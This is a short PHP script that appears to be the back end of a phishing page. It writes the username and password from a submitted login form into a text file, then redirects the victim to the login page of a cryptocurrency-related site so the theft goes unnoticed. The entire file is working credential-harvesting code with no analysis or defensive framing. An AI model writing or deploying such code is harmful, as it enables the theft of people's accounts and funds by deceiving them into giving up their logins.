<?php

    file_put_contents("usernames.txt", "Account: " . $_POST['username'] . "\nPass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: http://www.cryptocoinsniper.co/members/members/login/');
exit();
